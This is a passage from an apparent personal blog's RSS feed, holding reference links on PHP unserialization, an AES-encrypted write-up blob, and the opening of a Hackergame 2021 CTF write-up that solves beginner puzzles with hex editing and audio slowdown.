&lt;p&gt;&lt;a href=&#34;https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf&#34;&gt;us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.dev/php/php-src&#34;&gt;https://github.dev/php/php-src&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.webhek.com/post/packaging-your-php-apps-with-phar.html&#34;&gt;packaging-your-php-apps-with-phar&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/articles/web/205943.html&#34;&gt;PHAR反序列化拓展操作总结&lt;/a&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://cubicy.icu/2021/11/09/WriteUp%20%E6%97%A5%E5%93%ADschool-bus%20%E4%B8%8A%E4%BA%86%E9%82%A3%E4%B8%AAwriteup/</guid>
            <title>WriteUp 日哭school-bus 上了那个writeup</title>
            <link>http://cubicy.icu/2021/11/09/WriteUp%20%E6%97%A5%E5%93%ADschool-bus%20%E4%B8%8A%E4%BA%86%E9%82%A3%E4%B8%AAwriteup/</link>
            <category>Write-Up</category>
            <category>SchoolBus</category>
            <pubDate>Tue, 09 Nov 2021 11:08:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;密钥请找本人索取^_^&lt;br&gt;AES CBC Zero padding 128bits&amp;#x2F;block IV&amp;#x3D;0  UTF-8&lt;br&gt;qboAHUOHL+uw94b2elojCJWHWKwqPtIwFzSDKPZqmHPSu0APpp7H0ibcQNIUgrwDCCwdydqP+T74+slwNh6PM4GTvT1CoF2thGIZi5yCS9HfleGi5hP58rxFM3HzQxaU9EcxOEYbtGObactrCOzKP&amp;#x2F;+tPittHwWWiL5uEQyt8ESrZlgr19O5mtM4zrkRoODCUtcna5XWuatk94T60ToF6ZrhqTb5v60dcwGjw3Zf1xaBRvYR2HltlogOzs&amp;#x2F;QoLrDm&amp;#x2F;gzGqxvddGPCaOEkF5nCzk4un7sl6RJD77GVxRA4IqYMSExrw&amp;#x2F;By3bqLJyL+3waQihC4E3teqyknbLGbYCtF5VKV32WmE8H0hEyP0KkpO6MTJBiz4mziI3M0+pmoTXIRiBSpISAGq7RbKMIs2cOFD7Baxx+vUXuCShr7ZExYTi3bHD3r435&amp;#x2F;F4WXA9NuFaNM5Lhu+rmFBRobYZ2Ur3BBIFDlTT6gI5XXgoVj9qhHx5DJWFlGcglkgefiabVxUmTFFohZPLnpJxGJByTi6Frw+epqfZkrY0eGTMPIBKcwQDqh1DnPDyxm+64Xr5fffzpmG&amp;#x2F;HNyq8Nsa1qpk8Yw+Vu4l03oDZ9CX0msubse852dj0ySNKgYXSOKnYet8jdjSC2eVd14nypMuok1BPUoHMv4rlme813n&amp;#x2F;lE8LehT5xRF8R+HFyxfsRb354Xr39YX5DpI61tS41P1A+IiXbWvGG7kUk7Ln4mV+UJe6FEWzNzD5f0o3thGCoYd7ccyUrVJTbFsnbz7wuCmWS9dFkx3QAOxkGcbgyPh9NtbkcfKYa&amp;#x2F;znW6GibzQf3NQZ2W4jQl&amp;#x2F;wEtVPMs1BzweyAI3XGoJy7ZdHrvrswzdSq9rrcJLYW8TLG4lCowCRwb0gx1d9RptT4Tnj15poEl3zW66+L9dSb6RxTgsWrh0MM20xHmLmAEkoVG5QtGpZjQUIiKrq2BDahZtKWQayM1c+x8PtdZysfGYxyW+nzq&amp;#x2F;frGKmEKwo8GMqiLwevXk1aLryVVf57ofS56w+cyYAwmJtJ3ZKyeV26k4+WkV7EHBrTbItrz8EG8uP1eTzz922bAOhdWVck80iAc2QeolUYa6Ohp4GPP0tN2Q+CtBuPgjaPERjt42ZfhmstjJ9OoOiFObtUH72Rvg0i8aK+NsaSM48jxxuCJ8atXf57uu6giunfmaGaQ8fbdd395Sq7mTbvUiTVEn9tQX23xYfKcpnHSPMGfdcmeL5LdYg153QHLRLJ79&amp;#x2F;vFbTKt6iLLbcImzlNgs70xE78rKHG3YFrrGwd41&amp;#x2F;DSOxLqHYE5tiHkb32Haoy+&amp;#x2F;d6NAAzahYrhx2x28DVDmJbotGIEjpCw4hvWSwAkT3toy0aRE5XpVpzzqXqxaSTteM+Vifzr&amp;#x2F;+zynUM7SUwbMvONbqyhqC6tKtYtEOFoknu80e20Id7Ja9nfWH8s0Z7iWeb0p&amp;#x2F;8i5yHvZVuuYFnDkcOz1z7VGmi6B7W2KTp9BWcjTupzxH+pnoGV+hMUHFiBoYrZJzt5bFpvOzEYJDHhq4oh8jxZMeKADJBwDfoNFaBeN2tVS93HJ1tT18YwI4BsxiDjBuX351JfepxVrP0d0DNlT&amp;#x2F;rYgCyeXzIiz244JReySuLe6mALcEg0htTn7oZt6yONG1LVq8mfQ6GXrSqIaeBbNrfP3FF7C+7Vri45CvV39Rnt9y2r3eKdOW2VGf+8XZ8JBWKwpT65u1lKxim+FDxxmqxY1nStKtm3v6K5FtcsBz3LmNBJPB9oaILV10XWIPVVOpgD4MwV4XFT&amp;#x2F;vpgoVhL0Det0atbj1KBG8A0dhLZwcWx72l&amp;#x2F;yuAoCLuMoXciNPsVmngkkuCFVEziPxgPqVfPQTbGQbk4raRfOkCbkK5nAS4MTeEfr61fvQwYVXPYRTXDx1DWbTUABHbG0e5f8OG7fKNpC8c8m94sZM6osTLAdus73OC5Lj&amp;#x2F;iHsOYgjfkW1KRnL7W5b2UOdNgUVyQueSNBmQEw4sW9J5+LWYd4NRE0qL8TLrjhL26u6L6RBVMEJomjcAQnOBGIiBVl4jSAgt1HcpnDn7JyV95Th5pPEJ7YGtgLkBkuvIpiIW9sGLwWJsWkJwQXyFTSxMaJeaxyz6q725nxYXrIXIq7uGUJrDaN60GNnwgL&amp;#x2F;swzqqlmF0gdorXScCHc06roB+27rYV3kEEguhmsyoyxHdX4J33BEXeqigi3JaTrsVafApgIKZYhN&amp;#x2F;uH5UKHgZ4Xr8Qq&amp;#x2F;aTVcnv8ovm6jwTZRnQFCZaPKQ995TL5Rfm8gF4ejv32i2g&amp;#x2F;0F1bxwJ3sqYCEo4cDtsWXeAY9pidVji6BHZ25oSuiYb2G7TBpfoo26Ey8e4l5zM0KRgeBmk6g3iXILfY6DH71fjzptJ+H4I5anThAZMycGTkr7UzknBxCluU98JK4WQnU3klY4E4ZZbHrYGmO3UwRxEzyqfFVB4JFSDbuWy4OJzmDCX+LFMAD5PfOKIDAIQ1Skm6j&amp;#x2F;UqPXoVIZelOk0A57WCZ+&amp;#x2F;eP0O5fpc1JhtkPkvfr7yQjFIHtRbJb2toReQxHtLvrFhAyBvC28xxI63fX&amp;#x2F;C1At2u3agpy4KnUzAwdVAUVq9f2DjxTkrh3btk83i8aLG2QQvg6DCr7KB9Tw4exkc6MMxtjtpbwgZx0dLsh&amp;#x2F;SyYBTRs+LgsfsBLVg5FhviLay+47uuXl6CQBZHQXcBl8LmRxOrYsHQnkgQ1qBpl7uJO5ru1rTMdbDP4+TSoxNcUEFZcHal0Baz4Srikc447dhDkvPtnEdIdxJEN5xnbHqd0EsE1f3Dn2vQLcQ7BeYWWUGLCdLte95y6EdYvL1r96Ggqv6izkQ&amp;#x2F;aImw5Hif5KPuGt1Og8GPPlywv8wIDpi&amp;#x2F;7V2Xw1FCOuJXSQRJjoKow87AcpKmmjKEHew0QdI6cOEBDwZki5bjFA9j6LW3NckoFOu7QTaA5alDsTWKJMnwHEN6Mn3IfoPVs7bqM9q6sPmDyoVUd8AjgA2iYkaJlS8TcXqWLl7z&amp;#x2F;4F5GjmmV7a9hcY&amp;#x2F;ClYN7zhagdUaFakLKkw0ngzsjZP45&amp;#x2F;Hn0HWUfDH7NaLLovWi&amp;#x2F;wKXYqrrMZkvKqVDhSD4U57zKCS05tBg0jqoW2digZPvzHJHDq2UV5o&amp;#x2F;9MaIyTPgzU7JhUTrKOD+HzX3ZYvsFrmUfx9eiCVK57OkxfDGrzmVCgjX9ZIn2r0UzEbI1mfjHq75DiES38S2g67ypcnjnX4&amp;#x2F;o2qmHI9GR7xzsB70Ol96WGcoOvYn2v6&amp;#x2F;ldWx8dGOBRiTXUWve4jgtdCWupi4O8AikIhktX8sTJ+VBEhNr9negjA+FQj3y1xaPYl4LTyzpgiaeIDBUZnyt8Lgl&amp;#x2F;fi&amp;#x2F;Nm12nQDhE2vEJ3R2cjciLWG50b6U+9r94bS0nzbY0uupbI+fep8DE7ty4NHo0TtFF&amp;#x2F;58f49MEj7c56AWzLGanI+OnYqYJ7w5tCbhY4V01jYYwEX6Ur0GWOZvsmOeR1kCSMLVWRcNipjOBr8LA9JeTfVr0WPyvl4rBD0RJ2ITrP3jn85iHVYMUCmTiXaav6poh1+WCPYM2J9q4bdwK1TBxX2vBCv33t&amp;#x2F;e6wABwqh5wsy1APhgzL1ZTZrSsnCNfnPXbJXtWCaexkYF58gRZ3+I2XZgYvmj37TT53qhayl7sNImuGLFWuWVH0um+ldqP1u0joF+&amp;#x2F;BiJTD1gbgtSE+HW3r+Ntd5OgQBbXHhy54d4ABucD7RqFS95GlwadZV6v4AjJFKFYh1rnDZHKVDT9Ux301iTmwFvPatYPwCyJAmJ4bndBzhmwDl&amp;#x2F;yU8KFuZ8zbA8yUr5nrtSu9A&amp;#x2F;I6rsRtMdKQTJMRZ4iL5s1zmZTzPVF1&amp;#x2F;VOoqIVLP8kDtuyyxVXGUcufl6nIHCYoQlbvvXQV3TWIlnut2uWxuedeTuOS3vQj1JDnmkEnc&amp;#x2F;BmjeY2zGFgxtDpTjwW&amp;#x2F;Eh9SFJq9ZctkGkPdwrXCXr+DThhguEGXS7fGJeScW5fN0&amp;#x2F;u1w&amp;#x2F;V4c4VW9&amp;#x2F;GNDBZRuG6AyUjEjVABlBj4fER+2vhhzgnzhTnh+j5qNpMFy7Jhd0gmLgdywSUTrK2U96l9tcZYnIMOnLlAzinaqDauE9KigK+x4tWxEW9LMmfCsmV72BRaIpx8xrrmvaF0DYLKCqxvY3SdCU3YIxA6iIMhShTN15M6znJzq8kufcm6FJ+iO6bzDnDLSwdUteGfQCgHKAK4S&amp;#x2F;NPsChjP5OB&amp;#x2F;qWZsq1KCFTUh1+04E+F2oHfwMUitqLV1blL4KPUeImUx0ldbeXHtEMxHwWX9CQbU2Ksd9iyCB9oye4ANR5FDpYJBC5Yvb9SAMW18zT99I2FfS6S5umUDm&amp;#x2F;uTR0V3fAjWMDwwjhuWH9YZRqOADr9UXNHdJn5M4MagfplbfBdWWiU0Waxc+14EZkX0&amp;#x2F;62UKO5YyZzkHrv2X0jckDbGFuG29fY6PJOnmY+UN6JhOJ52OfrjR4KIrp2SORgHzEUqD6YzF8zhmBsMZ8AY9&amp;#x2F;GMAGLbV1zhbuIls5FzIX1JdeJNzEUt31nIz5rEfhgXQa5eHFUqxrE7xZTzajOG0e&amp;#x2F;CF&amp;#x2F;xJeTt85iii40wTADQ875fgxnR6hBbqVGb6PVKekN&amp;#x2F;1CNbCyqyp&amp;#x2F;NbS8rS5Q+49NVtF8anddxlb6PkliqxlKlrBUmQKDT1d5tgkEeyNj8cBS4Ve3bJG4Pd526iqqmyW8y&amp;#x2F;EiGLa6RwVe9VmUB2qp&amp;#x2F;4GlWqZ&amp;#x2F;tb4Z5T4KkXvpEv6MtV5+DHyjqlDNSmYcFL9N8Zk31TyVckkMWxcrvYZ+gZnCGqiQQPmCXhYfGlaMDkBhAZNSBZwX0c1fyKNCu7wA2D29l&amp;#x2F;NquX2VfowrYAExOVlh6Gpa0O0BlyqCJYwI0lnaPpqhnhaDO6mTiokYuWOiQnSrVRBGHk2cxLKt0VH&amp;#x2F;hL92mWc13+AmEemKcOJJaj9RRAWZ0t3H7WjgMhJgR26xJufcfES74EM1FEta1s8vboiDfcTOwXCdUInCnV0Pq2atGpq4oCxuM8YdlR+iopxMehFm&amp;#x2F;FdR5tedsLN87jJIEC&amp;#x2F;CJcWYLF3wE4lt9NOJk10ZHRxSgLS6&amp;#x2F;42fGTFx+chZaN7JxAFhKPttpz3PG038aclzC7G&amp;#x2F;fR0wUXnoi0U2Aide+DZfRWLn05rPDMRuodYTLet&amp;#x2F;4GdbIgdGOqa0LReMei3+g8Ej+h2s0qRxb5fyixwjwCO1HDny5tK4Y3iG&amp;#x2F;KbGXo0vsMymGcAQNphEn94EHk6oaBlHRbgtcwWOEqMlSLLyI5z3OqmoxK6WLj0Kw9g3YiSFSYhCNwa9gw9032cRSLxWDhGGBSF5T9wmjn2J7y4jgg1qrlQa1oTJ+Ep1jBsTQKJIds+E&amp;#x2F;+XK3&amp;#x2F;dCQLIBWkcQFGXblOkukLR&amp;#x2F;uhCdMhhLcbsz1GqYI&amp;#x2F;29K7A6uj+zm8Ep&amp;#x2F;uLgpBQFrxFuIUYFQ4&amp;#x2F;1OO&amp;#x2F;ZkuscEGirPyeDkVeRHVjCt6JFCWUFC0X6ZNtbmSyD51BFNmv+gJroUxhddlWDADjDWI63N7tTWIPJ5mkv9VRM5WGZFrxSIiIZ9M4PXNTErzxRB3008xdtbUrKqlBuoPWsRK4Cea4IdiOyyISAtallenfMlWGvNV1FNzKY1CliJRLtEErg+5UurywxwuMDerKcMx5c&amp;#x2F;+3MoCtFTCLOp3JI8uL6M2qWbSuRFd1Q6PEEH&amp;#x2F;QUTHtmxopXhztQ5zoclhcKKugfxhz1iQLVRohWD&amp;#x2F;xnbjahebmp9pV836wIjebrltKo31KpluhberLabcbIBtGAqtT6BtadXtcwPX5ensTQNN7U6xPE4IAREcClVchuzQGalwss2s1si9D64RHkqX97txTJQ3Yk7xuGa+OmPCNPCGGadbEKbrhIPpCI&amp;#x2F;3ryILqToozUfDjXQrzl3rvNyxAy9pwtcWj1iBGFN&amp;#x2F;8JBkCBi0B+IspyFYk65RkOfiXE6X1I6IjjYyAUszYInPfOeY8RKrSnuxBj401BlRljYkTALlITzxAzVBytpxQwP4Ofhj1Gty8JVBdsveNvA2M6fw524lGFOadqThTqdP330aqL1HrJhhw&amp;#x2F;cZo+wAYmvo9dgrbDLlK8yDyLtBhRmCQAnwf&amp;#x2F;CtdVK3bqAlw2xr2S0tBNIq5dC&amp;#x2F;9QU+yiJSJlf57Ui186BnzLNLmfkpWxU5oW3RnWXaM21bqNvrarqnqEKxcQiTTP6Le1BDhuoceKzzB7rPlMjPO6GUXO3pFaZfMgwwPmNBvFEnCEsLngzjObiJARrEmtV&amp;#x2F;I5RRTUXMAwCK5ookoSFfFVfqTih36sJOaBCCDR+TEkQ3zQE2ZvV35OTb586cPbvp0B3Vd+RRnF79Z4+56etRg38pDY9EEFj&amp;#x2F;&amp;#x2F;trgxQ&amp;#x2F;QkYclWHqeUWm5pKhFZ+g2qLMlVs1K0q8d6sSsvt0R7iuDZtNZZLd9D&amp;#x2F;lxyz7rkGT7DpqTpOjvRZqG+VGquYaLFId+xE6nqPM8CEWz1&amp;#x2F;NT8691a6XX7qCdWSm78nmrZ&amp;#x2F;IX4IGGc5LZBLo8j9sf9lXqGNqSYKOjdkEIKswoYTfxRk4y4&amp;#x2F;cWo9f5nIbP+Vaw2bjZ5WKespE4CTAOxpk7DHXxh5wzYPld6NqjdYiaz1+DbLWVSIeRfX0h+bbsFal6+gDJ8hM5bHc5xrlim+nCloZXuBhEsd9ZEEIiGdew&amp;#x2F;l72jCnlfZH&amp;#x2F;tfxshLOAvJY86uGsytRp3UkGtDmnloRtJJ4lYB3aoIgcuQSt9NzyqU&amp;#x2F;sK8ivilobtO3s9+iDykFnLmtpI&amp;#x2F;c&amp;#x2F;wZMQ6na0GuyohYe397yya9UosBdt5jhumBxntnIPVeqKCdavin&amp;#x2F;P5AGbWo8LowD2pGyD0pHR9ptBYDuuIv4&amp;#x2F;tBuskdK3HQHPCOGIFj8Syqc9LG29IwtySpz&amp;#x2F;AkBEIg+81UJ5V+b5r7&amp;#x2F;jjlepp8ow049YyDcKzNP8HGAhfmYtEPb0zZKcd7ZyGYhID9RfUwHrPRSdSFuGDZhiBYhdrI2lpXaUgsbpho+CjUp74Dl6pl2RX+YNZSbl3P4wVfNBMlmOHWqJ8UEctbb&amp;#x2F;DVoSjs3C0kptMRBbBSwK8uUi9AR+Y17Ruti5Li7Hcc4iQ7FDJ7wnkAXD3KSGZ&amp;#x2F;OEvM1ghAazhRMeKANiZ&amp;#x2F;CGSidJwBq+PdF3RbqsshaWWjVi6oq9JktiCI78yJuZ+funSupw&amp;#x2F;M0YXKyiuXD6ZrxMcG5PjTWb&amp;#x2F;FH5XR2QtUTSwq&amp;#x2F;z1yYnhXTjtMjP6kex7yda58C&amp;#x2F;QD+0YBdKhyMxuwSzOixS5ryofQ5cavR&amp;#x2F;4zOBtxmDewhTSII+eLpgqFMdzZFnG7Bk4ot1AHPCOxA1bdEn3IzH9GQ7NMo3G4kskakXZC3K5QHcsgUr+&amp;#x2F;8k8fY79Utp&amp;#x2F;3sq&amp;#x2F;MqTgeml7NAau0jhkGbMANcr4jZj3N4tBsmo&amp;#x2F;InMiI7+H7k1fDa32BrzdoevMfJYA3PaDHFRFuoeDlWAnxAAyk11kKjnidwQ&amp;#x2F;rBqIzrdIBMAfyfbrA55Q47SBe7fwVrzFRBPKtjICzBPKzlIU5&amp;#x2F;xIfDo3IpEY8h6emLxN3dLLLuIBoCtm7MqkB9MA7hzlEwkGPY0oUwtH323Y43Y69s1ldtzi+J+tVbCJrz2y1VVo1sLtoRgxkTqjqCtJpOi2Q7JLLX1433EQ8tywYvxCjuBH4N8GVPsUCuZFVpUZ7kQEfpCCmRnyyIE8myFbHHKBqq369PP49Pv6OzpkbHJ2ZictG9Yoi85ahlyqbnSacOAIfRBnruBBqo4KwTbAgbesupr0cCPEEMfb0pdyhFFC91RfG0H0ASsdfZk66Jfd2TCjagq8&amp;#x2F;CKoCP2Vi+GLsV3du38v9uELTX3j3gxskoyDeb020ElGDk3L0rl2fIh8fa68knJSWs2z17N09NtGlNLzdbCu9AXBtq+bdxEOZXWk8u1o+YlFRFjphBNf9eMM3itN1&amp;#x2F;5wv2A3e++qsB3t3ZCyaz7ltIdzmy5us9lgNIo4h4ZYpHyUeuQbAqqb40v2w+0g1e&amp;#x2F;+9jtQJfZM+T+LEs16v8UQMB2Pr5Ug4lULpuYga76cbN&amp;#x2F;zebqqe5ABGYWEIBFM+bxLvNv6c3v0VREhA1QvSEqLeYR6OV15tOIzjpJf4dGP6URUYyIz1UlJkEQZSjUFCq2H76YOtieydin+5wXwB&amp;#x2F;s+jicn09aE6B3OYtp2CDBsDOdTtoOOzfz85Ee1dLhL9ogTrbaxkF0w8HRyACovRiag31U05liMpzg1CMVrDQo5qRUAdcNyJEXkSPbY88iZ75h&amp;#x2F;+9N8JhSeJQzxrhl5nhlR9jct9H0RP8fGdt1EGlHCMsxGRVmRBAxykf2bt5N6qnN6&amp;#x2F;Sjdfi0oPDxWdi3Y9M9ZWxgbqt5Tg&amp;#x2F;UW6v9EGe0+hA8Ii&amp;#x2F;Bq5Idw&amp;#x2F;gFR5jlnTwKdB58apXtbtaYnyU3T7dAWwtZ4OvIfv7&amp;#x2F;gpPbeyS1TqY71Gib1CW&amp;#x2F;lWfIO&amp;#x2F;0H98bOHPDIl8Ut3fi5xQG0yqHgQS165tTf2xo1i1sqD6tNDhCIDu&amp;#x2F;1uefrNO3ExZh3Ea9Ac3428&amp;#x2F;GWPVHlg4sqLKlZPds5NfKh0df+VPT3OLPLCH55NQXFtqwE&amp;#x2F;ZsCguOl42vTcKWrkXl71Gp+X5x+mdAu+H1KNhU3f6p&amp;#x2F;5sXiLyWT+T7h4SGvyOeBLUwJer4tFpByMATG560KhAuixXyzXwv8j70CyJp8s399T+N8eQhAxhXVBxgWdtl6Eu+rBPWbHmZXEH1&amp;#x2F;mghBG+RFwuCh4jNPDeQDOBewYrmimmbpmFt1Iqz&amp;#x2F;fuI5eSH8zQLMuzPKYhEG4p+5kPdBQkQz4NWzlrQ0yE2pXBvPNPngsljuC3pAVjRrUVb7MZtuO3BXPeDSb+EXgylh5rBmG7bkk43bdQ4TQyNs&amp;#x2F;FYt7cQ7tFzBQUhWoIDNWKiEs0hThjLY4Aw9zFxuF3Uf9H+fU7GlwZBrsU+QdPR0vKxB5EeyHUamO&amp;#x2F;NYRd5RtFNym4HhMqSEoTQPqLv79hzNyMyMvbrkOly&amp;#x2F;nIwAyXmBmaVTVwVZr1fT+zXgzQL+VY5ByLjJrDw4ghbk67RGlX0qTyXV4mXY41j+0YZioIDBDJHP7D8QHrhQpzOzhMyxkQ7WvTLWEaZqbvGSXN619WL1j9XZOecnOAZazEm0BawPD9vVCMar6VD01ZKHIQVY6+EmdhaWr9j4afovGGPIeFaLzg1YwA6czDMdWH0pbZmV539qrs+sX+toGO5fXI7buTnjvcbi85wKSPj1xlvSIVYD05WH9EX2S8IsJrdLqxVlG4IQj4TIzUpbKxuChuNjDQO0idakciMB9Mkg7ZEolOltVBvZWv47UhoMZHfECUqQARpkRfl8B3YW37L1ihQC1HVpGSI9EiqCLd6ZD0cjg6+E1JK3yDZ3pr0or57JCMX2U0Lf3G3zDiZ9E+kit5C4HsNPCA4Xq9qLcEnSTbUrwR&amp;#x2F;+Ol6DndvqxVSUjYEJCrmqp&amp;#x2F;Fi1CY2XgCle5ojZ9IAWjrbg01FGZMCi3iiSfILVNcl8q4ZZFLweZbi+TivrAC+zRX8cpdCBSMrdC5pCMsIPvzRLJNm+jY32VdintOlE4xMHTk9rr2uNKJ4hQKJREyoz7XCYJrlo9LYIcS2o9lKo3xjSkpnC0SFtg0Sy&amp;#x2F;pcpZw8wyOO2hTXOTmKzyOlw7VH1LtxTB14XoT95Y7euHiB&amp;#x2F;11oz+6uOb3uRm4iql1s+tXka5CfeFhSt9xk3k4S91VDa7f3akOPDdxCQ701qVjM5&amp;#x2F;aat2ARuoYfoghi1AwKpuWYchdLoYSrOiXX91SeH4gOR5UP8KXg2TnNOTvpHN5LRBKm58rMDe7ZmZCNM4AnubKNBP&amp;#x2F;X8UNMaIokp3+I6KpH0c3jmTnSHnLwoi5oqfNx&amp;#x2F;qT2K7ePGq3nqfTkCDqWKSWTe+QG6BsOXetF9mSKh8lPJbru3DfzZ6ICHsZIpfy8Vcfks5Hk+LT44&amp;#x2F;jwWR9xz0B&amp;#x2F;ia2bB6mG7X5Wo5AfbIFSVtrwYmm&amp;#x2F;bx5Mib9QOK1U2X9zav7ObfFmMpENUCxEi1tr+bVQt&amp;#x2F;iubPbpFZ6DNce8msWvzHhhV+81gn&amp;#x2F;QQ3YW+yq&amp;#x2F;Sm5CTP9pMfI72Mt6XCYtr1a6b&amp;#x2F;vWaKnBKOL7dS7w5ORYbH9GlxhtEv4s5wdh+uqDjIZJp4jTt8ysEikkyJg8vj60Ymgd4Q6GEytoArUF7MfNB&amp;#x2F;hYcgcCEOiOcVTRWL&amp;#x2F;sLMDeaSklA1i9tVBUP95ROYnHIR4qoKdqBsEAbGBfjnNMiSwqp&amp;#x2F;pdZIvF0LtjzRxgD5&amp;#x2F;BOvxZtq9zpu8WTP+InLqLtMkXXffeNwM7fKFvfb3RNQfXMPa8wNMLD80D3NyeVEJBZ3AZzhEKaruVZMfhbS&amp;#x2F;Nmcec9GF2nWQm2L8+qLxWbi0OM1lXBuCvMZ5DU8u5tr12a&amp;#x2F;vTwM0CP4gZ0ga9TSNVb2vfJdtHDuC9BSlTB7KcA&amp;#x2F;&amp;#x2F;xvozzLKhfZEUQvmOoyxtzthFSf&amp;#x2F;b3KhAUgu5GzrMSPPiEGNFIWbqm0UF9j5GStLEXm9fOuFvefZw5mH5q0zoIr4cbLFjRjE67EkG0riIEpGjoSG5c3GTsALEhfkv2VpxhSbtucDmKnftpHxYZQcJ+Atg9MnlcZ2mLE2wi8TqJ&amp;#x2F;Y8ODehHR6ocioUPGxZJblrquxAjAARnsqNZ1eIJIO2vOH83HUg0zGhfq4ag4DEEwIxczSRqNnMSuSta+O80zpla9CVaDwcLUG7KMyu0pTrwSLtuGgSa14iE+SQza7jIJs8PTwwRMb7N89oOaXs3QWsmlSybak0pgJ+pZLCiPQYHgD91kaTCRDOOz2sX1F4FSe4OP8ehuEH5vVhcg2&amp;#x2F;FRn0w5AfPRhz30XstZkZrJzYWLNLcB1uPC1bR5YD44AgaRPWQQmLdkmRj8ea5siGd3aDEPDAfNUUatAzwBsfZKZUis2P5LbAJpTjbxbQ9&amp;#x2F;Y8b9aqafukEV3Vs23IEyTx4uRWGUqbpP&amp;#x2F;e9vr6gFGcjM80TkKrsoiG6CuySRQUnUPGAmco8TZwI1ETwthdL5Xh2D82vI1Q93Lh1n194uCSLKPbVIFgxONJIKyIJFfAU&amp;#x2F;kP9Beqb+oLoBulIbDeechaTNfe8RrzZM&amp;#x3D;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://cubicy.icu/2021/10/30/Hackergame2021%20%E9%83%A8%E5%88%86WriteUp/</guid>
            <title>Hackergame2021 部分WriteUp</title>
            <link>http://cubicy.icu/2021/10/30/Hackergame2021%20%E9%83%A8%E5%88%86WriteUp/</link>
            <category>Write-Up</category>
            <category>Hackergame</category>
            <pubDate>Sat, 30 Oct 2021 16:11:00 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;yyyのWriteUp&#34;&gt;&lt;a href=&#34;#yyyのWriteUp&#34; class=&#34;headerlink&#34; title=&#34;yyyのWriteUp&#34;&gt;&lt;/a&gt;yyyのWriteUp&lt;/h1&gt;&lt;hr&gt;
&lt;h2 id=&#34;一点碎碎念&#34;&gt;&lt;a href=&#34;#一点碎碎念&#34; class=&#34;headerlink&#34; title=&#34;一点碎碎念&#34;&gt;&lt;/a&gt;一点碎碎念&lt;/h2&gt;&lt;p&gt;这是我的第一次Hackergame&amp;#x2F;CTF比赛，感觉很有意思。前几天心态有点崩，好在调整过来了。大家还是要把Hackergame当做game。最开心的是认识了好多大佬，抱大腿.jpg  &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://img2020.cnblogs.com/blog/1335480/202110/1335480-20211030161203937-1693462675.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;对自己的吐槽：EasyRSA差点做出来，扩展欧几里得写错弃疗了；RAID0卡在软件没有激活码不让保存；和各种小测撞；各种体调不良，饮食睡眠不佳；晚上学校断电没法做，我又是大夜猫子……奇奇怪怪挡路的东西一直不少，归根结底还是太菜了啦。&lt;br&gt;总之非常感谢@TonyCrane大佬、GodSpeed大佬及群内各成员的鼓励支持帮助（膜不算）。&lt;br&gt;希望我能早日学会binary和math。  &lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;签到&#34;&gt;&lt;a href=&#34;#签到&#34; class=&#34;headerlink&#34; title=&#34;签到&#34;&gt;&lt;/a&gt;签到&lt;/h2&gt;&lt;p&gt;这题二分一下page参数即可。&lt;br&gt;&lt;del&gt;鼠标连点器&lt;/del&gt;  &lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;进制十六——参上&#34;&gt;&lt;a href=&#34;#进制十六——参上&#34; class=&#34;headerlink&#34; title=&#34;进制十六——参上&#34;&gt;&lt;/a&gt;进制十六——参上&lt;/h2&gt;&lt;p&gt;使用Hex Editor Neo直接新建文件抄写即可。当然OCR识别也行吧。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;去吧！追寻自由的电波&#34;&gt;&lt;a href=&#34;#去吧！追寻自由的电波&#34; class=&#34;headerlink&#34; title=&#34;去吧！追寻自由的电波&#34;&gt;&lt;/a&gt;去吧！追寻自由的电波&lt;/h2&gt;&lt;p&gt;下载音频后可以听出是一段人声，但是语速极快。于是使用Adobe Audition CC打开，效果-&amp;gt;伸缩与变调放慢速度，适当调节音高就能开始听写了。可以发现这是&lt;strong&gt;NATO Phonetic Alphabet&lt;/strong&gt;：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;A ALPHA&lt;br&gt;B BRAVO&lt;br&gt;C CHARLIE&lt;br&gt;D DELTA&lt;br&gt;E ECHO&lt;br&gt;F FOXTROT&lt;br&gt;G GOLF&lt;br&gt;H HOTEL&lt;br&gt;I INDIA&lt;br&gt;J JULIET&lt;br&gt;K KILO&lt;br&gt;L LIMA&lt;br&gt;M MIKE&lt;br&gt;N NOVEMBER&lt;br&gt;O OSCAR&lt;br&gt;P PAPA&lt;br&gt;Q QUEBEC&lt;br&gt;R ROMEO&lt;br&gt;S SIERRA&lt;br&gt;T TANGO&lt;br&gt;U UNIFORM&lt;br&gt;V VICTOR&lt;br&gt;W WHISKEY&lt;br&gt;X X-RAY&lt;br&gt;Y YANKEE&lt;br&gt;Z ZULU  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h2 id=&#34;猫咪问答-Pro-Max&#34;&gt;&lt;a href=&#34;#猫咪问答-Pro-Max&#34; class=&#34;headerlink&#34; title=&#34;猫咪问答 Pro Max&#34;&gt;&lt;/a&gt;猫咪问答 Pro Max&lt;/h2&gt;&lt;p&gt;General× 杂技√  &lt;/p&gt;
